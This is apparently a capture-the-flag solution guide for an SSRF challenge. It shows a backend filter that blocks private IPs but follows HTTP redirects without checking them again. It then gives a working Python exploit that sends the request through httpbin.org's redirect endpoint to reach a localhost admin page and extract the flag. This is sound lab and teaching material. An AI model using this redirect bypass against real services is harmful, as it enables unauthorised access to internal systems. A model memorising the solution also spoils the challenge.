# A05 Medium: Solution Guide

### Vulnerability Analysis
The backend checks:
```python
ip = socket.gethostbyname(hostname)
ip_obj = ipaddress.ip_address(ip)
if ip_obj.is_loopback or ip_obj.is_private or ip == "0.0.0.0":
    return "[ACCESS DENIED] ..."
```
Then executes:
```python
with urllib.request.urlopen(req, timeout=6) as resp:
    content = resp.read()
```
Because `urlopen` follows HTTP `302 Found` redirects without re-validating the redirected destination, an external URL resolving to a public IP can redirect the connection internally to `http://127.0.0.1:6014/admin/status`.

### Exploit Script
```python
import requests
import re

TARGET = "http://127.0.0.1:6014"

# Using open redirect service or internal relay endpoint
payload_url = f"http://httpbin.org/redirect-to?url=http://127.0.0.1:6014/admin/status"

r = requests.get(TARGET, params={"url": payload_url})
print(r.text)
if "RTSA{" in r.text:
    print("Flag:", re.search(r'RTSA\{.*?\}', r.text).group(0))
```
